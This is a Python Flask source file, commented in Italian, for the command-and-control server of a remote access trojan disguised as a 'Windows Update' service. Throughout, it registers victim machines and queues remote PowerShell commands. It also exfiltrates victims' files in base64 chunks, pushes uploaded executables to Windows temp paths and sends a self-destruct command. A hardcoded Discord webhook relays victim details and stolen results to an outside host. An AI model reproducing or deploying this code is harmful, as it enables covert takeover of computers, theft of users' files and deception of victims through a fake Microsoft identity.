from flask import Flask, request, jsonify, send_file
import threading
import time
import json
import os
import hashlib
import base64
from datetime import datetime
import requests

app = Flask(__name__)

# Configurazione
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1435284134162464900/avJVpeaibF4iQyUlrD73-2JFZvpmNtZWeX-Cmbot3QU3tadH1wxjuOuZ-c7f9FsckPSt"  # ⚠️ Opzionale
CURRENT_VERSION = "3.0-stealth"

class ClientManager:
    def __init__(self):
        self.clients = {}  # client_id -> client_data
        self.device_to_client = {}  # device_id -> client_id
        self.commands_queue = {}
        self.lock = threading.Lock()
        self.client_counter = 1000
    
    def get_or_create_client(self, device_id, client_data):
        """
        Trova client esistente o crea nuovo basato su device_id stabile
        """
        with self.lock:
            # Se device già registrato, aggiorna dati
            if device_id in self.device_to_client:
                client_id = self.device_to_client[device_id]
                
                # Aggiorna dati client
                self.clients[client_id] = {
                    **self.clients.get(client_id, {}),
                    **client_data,
                    "last_seen": datetime.now(),
                    "device_id": device_id
                }
                
                return client_id
            
            # Nuovo device - crea nuovo client
            else:
                client_id = f"C{self.client_counter}"
                self.client_counter += 1
                
                self.clients[client_id] = {
                    **client_data,
                    "first_seen": datetime.now(),
                    "last_seen": datetime.now(),
                    "device_id": device_id
                }
                
                self.device_to_client[device_id] = client_id
                
                # Notifica Discord
                if DISCORD_WEBHOOK:
                    try:
                        hostname = client_data.get('hostname', 'Unknown')
                        username = client_data.get('username', 'Unknown')
                        os_info = client_data.get('os', 'Unknown')
                        
                        payload = {
                            "content": f"🆕 **Nuovo Client** {client_id}\n"
                                      f"**Host:** {hostname}\n"
                                      f"**User:** {username}\n"
                                      f"**OS:** {os_info}",
                            "username": "Windows Update Server"
                        }
                        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
                    except:
                        pass
                
                return client_id
    
    def add_command(self, client_id, command):
        with self.lock:
            if client_id not in self.commands_queue:
                self.commands_queue[client_id] = []
            self.commands_queue[client_id].append(command)
    
    def get_command(self, client_id):
        with self.lock:
            if client_id in self.commands_queue and self.commands_queue[client_id]:
                return self.commands_queue[client_id].pop(0)
            return None
    
    def remove_client(self, client_id):
        with self.lock:
            if client_id in self.clients:
                device_id = self.clients[client_id].get('device_id')
                if device_id in self.device_to_client:
                    del self.device_to_client[device_id]
                del self.clients[client_id]
            
            if client_id in self.commands_queue:
                del self.commands_queue[client_id]
    
    def list_clients(self):
        with self.lock:
            return {
                cid: {
                    "hostname": info.get("hostname", "Unknown"),
                    "username": info.get("username", "Unknown"),
                    "os": info.get("os", "Unknown"),
                    "device_id": info.get("device_id", "Unknown"),
                    "last_seen": info.get("last_seen").isoformat() if info.get("last_seen") else "Unknown",
                    "first_seen": info.get("first_seen").isoformat() if info.get("first_seen") else "Unknown",
                    "version": info.get("version", "Unknown"),
                    "is_installed": info.get("is_installed", False)
                }
                for cid, info in self.clients.items()
            }

client_manager = ClientManager()

def send_to_discord(message):
    if not DISCORD_WEBHOOK:
        return
    
    try:
        payload = {"content": f"**[SERVER]** {message[:1500]}"}
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
    except:
        pass

# ============================================
# 📊 API ENDPOINTS
# ============================================

@app.route('/')
def home():
    clients = client_manager.list_clients()
    return f"""
    <h1>Windows Update Management v{CURRENT_VERSION}</h1>
    <p>Client attivi: {len(clients)}</p>
    <p><a href="/admin">Admin Panel</a></p>
    <p><a href="/api/clients">JSON Clients</a></p>
    """

@app.route('/admin')
def admin_panel():
    clients = client_manager.list_clients()
    
    clients_options = ""
    for client_id, info in clients.items():
        clients_options += f'''
        <option value="{client_id}">
            {client_id} - {info['hostname']} ({info['username']}) - {info['os']}
        </option>'''
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Update Admin Panel</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 20px; }}
            .section {{ margin: 20px 0; padding: 15px; border: 1px solid #ccc; border-radius: 5px; }}
            textarea, input {{ width: 100%; margin: 5px 0; }}
            button {{ padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer; }}
            button:hover {{ background: #0056b3; }}
        </style>
    </head>
    <body>
        <h2>Windows Update Management Panel</h2>
        
        <div class="section">
            <h3>📋 Comandi Predefiniti</h3>
            <form action="/api/send_command" method="post">
                <label>Client:</label><br>
                <select name="client_id" style="width: 100%; padding: 5px;">
                    {clients_options}
                </select><br><br>
                
                <label>Comando:</label><br>
                <select name="command" style="width: 100%; padding: 5px;">
                    <option value="systeminfo">System Information</option>
                    <option value="list_files">List Files (User folders)</option>
                    <option value="active_users">Active Users</option>
                    <option value="get_info">Client Info</option>
                    <option value="self_destruct">💣 Self Destruct</option>
                </select><br><br>
                
                <button type="submit">Invia Comando</button>
            </form>
        </div>
        
        <div class="section">
            <h3>⚡ PowerShell Live</h3>
            <form action="/api/send_powershell" method="post">
                <label>Client:</label><br>
                <select name="client_id" style="width: 100%; padding: 5px;">
                    {clients_options}
                </select><br><br>
                
                <label>Comando PowerShell:</label><br>
                <textarea name="command" rows="4" placeholder="Get-Process | Select -First 10"></textarea><br><br>
                
                <button type="submit">Esegui PowerShell</button>
            </form>
        </div>
        
        <div class="section">
            <h3>📥 Download File from Client</h3>
            <form action="/api/request_download" method="post">
                <label>Client:</label><br>
                <select name="client_id" style="width: 100%; padding: 5px;">
                    {clients_options}
                </select><br><br>
                
                <label>Percorso file sul client:</label><br>
                <input type="text" name="filepath" placeholder="C:\\Users\\test\\document.txt" style="padding: 5px;"><br><br>
                
                <button type="submit">Richiedi Download</button>
            </form>
        </div>
        
        <div class="section">
            <h3>📤 Upload File to Client</h3>
            <form action="/api/prepare_upload" method="post">
                <label>Client:</label><br>
                <select name="client_id" style="width: 100%; padding: 5px;">
                    {clients_options}
                </select><br><br>
                
                <label>Percorso locale sul server:</label><br>
                <input type="text" name="server_path" placeholder="uploads/payload.exe" style="padding: 5px;"><br><br>
                
                <label>Percorso destinazione sul client:</label><br>
                <input type="text" name="client_path" placeholder="C:\\Windows\\Temp\\update.exe" style="padding: 5px;"><br><br>
                
                <button type="submit">Prepara Upload</button>
            </form>
        </div>
        
        <div class="section">
            <h3>📊 Client Attivi ({len(clients)})</h3>
            <table border="1" cellpadding="5" style="width: 100%; border-collapse: collapse;">
                <tr>
                    <th>ID</th>
                    <th>Hostname</th>
                    <th>User</th>
                    <th>OS</th>
                    <th>Ultimo visto</th>
                    <th>Azioni</th>
                </tr>
                {"".join([
                    f'''<tr>
                        <td>{cid}</td>
                        <td>{info['hostname']}</td>
                        <td>{info['username']}</td>
                        <td>{info['os']}</td>
                        <td>{info['last_seen'].split('T')[0] if 'T' in info['last_seen'] else info['last_seen']}</td>
                        <td>
                            <form action="/api/send_command" method="post" style="display: inline;">
                                <input type="hidden" name="client_id" value="{cid}">
                                <input type="hidden" name="command" value="get_info">
                                <button type="submit" style="padding: 3px 8px; font-size: 12px;">Info</button>
                            </form>
                            <form action="/api/send_command" method="post" style="display: inline;">
                                <input type="hidden" name="client_id" value="{cid}">
                                <input type="hidden" name="command" value="self_destruct">
                                <button type="submit" style="padding: 3px 8px; font-size: 12px; background: #dc3545;">💣</button>
                            </form>
                        </td>
                    </tr>'''
                    for cid, info in clients.items()
                ]) if clients else '<tr><td colspan="6">Nessun client connesso</td></tr>'}
            </table>
        </div>
        
        <p><a href="/">Torna alla Home</a></p>
    </body>
    </html>
    '''

# ============================================
# 🔄 API ENDPOINTS
# ============================================

@app.route('/api/register', methods=['POST'])
def register_client():
    """Registra nuovo client o aggiorna esistente"""
    try:
        data = request.json
        
        if not data or 'device_id' not in data:
            return jsonify({"status": "error", "message": "device_id required"}), 400
        
        device_id = data['device_id']
        
        # Crea/aggiorna client
        client_id = client_manager.get_or_create_client(device_id, data)
        
        send_to_discord(f"🟢 Client {client_id} attivo - {data.get('hostname', 'Unknown')}")
        
        return jsonify({
            "status": "success",
            "client_id": client_id,
            "message": "Client registered/updated"
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/heartbeat', methods=['GET'])
def heartbeat():
    """Endpoint heartbeat - leggero"""
    try:
        client_id = request.args.get('client_id')
        device_id = request.args.get('device_id')
        
        if not client_id or not device_id:
            return jsonify({"status": "error", "message": "Missing parameters"}), 400
        
        # Verifica client esistente
        with client_manager.lock:
            if client_id not in client_manager.clients:
                return jsonify({"status": "reregister", "message": "Client not found"}), 404
        
        # Controlla se ci sono comandi in coda
        command = client_manager.get_command(client_id)
        
        if command:
            return jsonify({
                "status": "command_available",
                "message": "Command waiting"
            })
        else:
            # Aggiorna last_seen
            with client_manager.lock:
                if client_id in client_manager.clients:
                    client_manager.clients[client_id]["last_seen"] = datetime.now()
            
            return jsonify({
                "status": "ok",
                "message": "Heartbeat received"
            })
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/get_command', methods=['GET'])
def get_command():
    """Restituisce comando in coda per il client"""
    try:
        client_id = request.args.get('client_id')
        
        if not client_id:
            return jsonify({"status": "error", "message": "client_id required"}), 400
        
        command = client_manager.get_command(client_id)
        
        if command:
            send_to_discord(f"📤 Invio comando a {client_id}: {command[:100]}")
            
            return jsonify({
                "status": "success",
                "command": command
            })
        else:
            return jsonify({
                "status": "no_command",
                "message": "No commands available"
            })
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/results', methods=['POST'])
def receive_results():
    """Riceve risultati dai client"""
    try:
        data = request.json
        
        if not data:
            return jsonify({"status": "error", "message": "No data"}), 400
        
        client_id = data.get('client_id')
        command = data.get('command', 'unknown')
        results = data.get('results', {})
        
        # Salva risultati su file
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"results_{client_id}_{timestamp}.json"
        
        os.makedirs("results", exist_ok=True)
        
        with open(f"results/{filename}", 'w') as f:
            json.dump(data, f, indent=2)
        
        # Log su Discord
        result_preview = str(results)[:500]
        send_to_discord(f"📊 Risultati da {client_id}\n"
                       f"Comando: {command}\n"
                       f"Risultato: {result_preview}")
        
        return jsonify({"status": "success", "message": "Results saved"})
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/receive_file_info', methods=['POST'])
def receive_file_info():
    """Riceve informazioni su file da scaricare"""
    try:
        data = request.json
        client_id = data.get('client_id')
        file_info = data.get('results', {}).get('file_info', {})
        
        if not file_info:
            return jsonify({"status": "error", "message": "No file info"}), 400
        
        # Salva file info per download chunked
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"download_{client_id}_{timestamp}.info"
        
        os.makedirs("downloads", exist_ok=True)
        
        with open(f"downloads/{filename}", 'w') as f:
            json.dump({
                "client_id": client_id,
                "file_info": file_info,
                "request_time": timestamp,
                "status": "pending"
            }, f, indent=2)
        
        send_to_discord(f"📥 Download richiesto da {client_id}\n"
                       f"File: {file_info.get('filename', 'unknown')}\n"
                       f"Size: {file_info.get('size', 0)} bytes")
        
        return jsonify({
            "status": "success",
            "message": "File info received",
            "info_file": filename
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/upload_chunk', methods=['POST'])
def upload_chunk():
    """Riceve chunk di file da client"""
    try:
        data = request.json
        
        client_id = data.get('client_id')
        filename = data.get('filename')
        chunk_index = data.get('chunk_index')
        total_chunks = data.get('total_chunks')
        chunk_data = data.get('data')
        is_last = data.get('is_last', False)
        
        if not all([client_id, filename, chunk_data is not None]):
            return jsonify({"status": "error", "message": "Missing parameters"}), 400
        
        # Decodifica chunk
        try:
            binary_data = base64.b64decode(chunk_data)
        except:
            return jsonify({"status": "error", "message": "Invalid base64"}), 400
        
        # Salva chunk
        os.makedirs(f"downloads/{client_id}", exist_ok=True)
        
        chunk_filename = f"downloads/{client_id}/{filename}.chunk{chunk_index:04d}"
        
        with open(chunk_filename, 'wb') as f:
            f.write(binary_data)
        
        # Se è l'ultimo chunk, ricostruisci file
        if is_last:
            output_path = f"downloads/{client_id}_{filename}"
            
            with open(output_path, 'wb') as outfile:
                for i in range(total_chunks):
                    chunk_file = f"downloads/{client_id}/{filename}.chunk{i:04d}"
                    if os.path.exists(chunk_file):
                        with open(chunk_file, 'rb') as infile:
                            outfile.write(infile.read())
                        os.remove(chunk_file)  # Cleanup chunk
            
            send_to_discord(f"✅ Download completato: {filename}\n"
                           f"Da: {client_id}\n"
                           f"Size: {os.path.getsize(output_path)} bytes")
            
            # Rimuovi directory chunk
            try:
                os.rmdir(f"downloads/{client_id}")
            except:
                pass
        
        return jsonify({"status": "success", "chunk": chunk_index})
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/send_command', methods=['POST'])
def send_command():
    """Web interface - invia comando"""
    try:
        client_id = request.form.get('client_id')
        command = request.form.get('command')
        
        if not client_id or not command:
            return "Errore: client_id e command richiesti", 400
        
        client_manager.add_command(client_id, command)
        send_to_discord(f"🌐 Comando web '{command}' per {client_id}")
        
        return f'''
        <h3>Comando Inviato!</h3>
        <p>Client: {client_id}</p>
        <p>Comando: {command}</p>
        <p><a href="/admin">Torna al Panel</a></p>
        '''
        
    except Exception as e:
        return f"Errore: {str(e)}", 500

@app.route('/api/send_powershell', methods=['POST'])
def send_powershell():
    """Web interface - invia comando PowerShell"""
    try:
        client_id = request.form.get('client_id')
        ps_command = request.form.get('command')
        
        if not client_id or not ps_command:
            return "Errore: parametri mancanti", 400
        
        # Costruisci comando per client
        command = f"powershell_live:{ps_command}"
        client_manager.add_command(client_id, command)
        
        send_to_discord(f"⚡ PowerShell per {client_id}: {ps_command[:100]}")
        
        return f'''
        <h3>PowerShell Inviato!</h3>
        <p>Client: {client_id}</p>
        <p>Comando: {ps_command}</p>
        <p><a href="/admin">Torna al Panel</a></p>
        '''
        
    except Exception as e:
        return f"Errore: {str(e)}", 500

@app.route('/api/request_download', methods=['POST'])
def request_download():
    """Richiede download file da client"""
    try:
        client_id = request.form.get('client_id')
        filepath = request.form.get('filepath')
        
        if not client_id or not filepath:
            return "Errore: parametri mancanti", 400
        
        command = f"download_file:{filepath}"
        client_manager.add_command(client_id, command)
        
        send_to_discord(f"📥 Download richiesto da {client_id}: {filepath}")
        
        return f'''
        <h3>Download Richiesto!</h3>
        <p>Client: {client_id}</p>
        <p>File: {filepath}</p>
        <p>Il file apparirà nella cartella 'downloads' quando pronto.</p>
        <p><a href="/admin">Torna al Panel</a></p>
        '''
        
    except Exception as e:
        return f"Errore: {str(e)}", 500

@app.route('/api/prepare_upload', methods=['POST'])
def prepare_upload():
    """Prepara upload file a client"""
    try:
        client_id = request.form.get('client_id')
        server_path = request.form.get('server_path')
        client_path = request.form.get('client_path')
        
        if not all([client_id, server_path, client_path]):
            return "Errore: parametri mancanti", 400
        
        # Verifica file esista
        if not os.path.exists(server_path):
            return f"Errore: file non trovato: {server_path}", 404
        
        # Leggi file e codifica base64
        with open(server_path, 'rb') as f:
            file_content = f.read()
        
        base64_content = base64.b64encode(file_content).decode('utf-8')
        
        # Costruisci comando (potrebbe essere troppo grande, in produzione fare chunking)
        if len(base64_content) > 1000000:  # 1MB
            return "Errore: file troppo grande (>1MB). Implementare chunking.", 400
        
        command = f"upload_file|{client_path}|{base64_content}"
        client_manager.add_command(client_id, command)
        
        send_to_discord(f"📤 Upload a {client_id}: {os.path.basename(server_path)} → {client_path}")
        
        return f'''
        <h3>Upload Preparato!</h3>
        <p>Client: {client_id}</p>
        <p>File: {os.path.basename(server_path)}</p>
        <p>Destinazione: {client_path}</p>
        <p>Size: {len(file_content)} bytes</p>
        <p><a href="/admin">Torna al Panel</a></p>
        '''
        
    except Exception as e:
        return f"Errore: {str(e)}", 500

@app.route('/api/clients', methods=['GET'])
def list_clients_api():
    """API JSON per lista client"""
    clients = client_manager.list_clients()
    return jsonify({
        "status": "success",
        "count": len(clients),
        "clients": clients
    })

@app.route('/api/cleanup', methods=['POST'])
def cleanup():
    """Pulizia client non visti da più di 24h"""
    try:
        cutoff = datetime.now().timestamp() - (24 * 3600)
        removed = 0
        
        with client_manager.lock:
            to_remove = []
            for client_id, info in client_manager.clients.items():
                last_seen = info.get('last_seen')
                if last_seen and hasattr(last_seen, 'timestamp'):
                    if last_seen.timestamp() < cutoff:
                        to_remove.append(client_id)
            
            for client_id in to_remove:
                client_manager.remove_client(client_id)
                removed += 1
        
        return jsonify({
            "status": "success",
            "removed": removed,
            "message": f"Rimossi {removed} client inattivi"
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# ============================================
# 🏁 AVVIO SERVER
# ============================================
if __name__ == '__main__':
    # Crea directory necessarie
    os.makedirs("results", exist_ok=True)
    os.makedirs("downloads", exist_ok=True)
    os.makedirs("uploads", exist_ok=True)
    
    # Avvia thread di cleanup
    def cleanup_loop():
        while True:
            time.sleep(3600)  # Ogni ora
            try:
                with app.app_context():
                    cleanup()
            except:
                pass
    
    cleanup_thread = threading.Thread(target=cleanup_loop, daemon=True)
    cleanup_thread.start()
    
    send_to_discord(f"🚀 Windows Update Server v{CURRENT_VERSION} avviato")
    
    # PythonAnywhere usa PORT environment variable
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
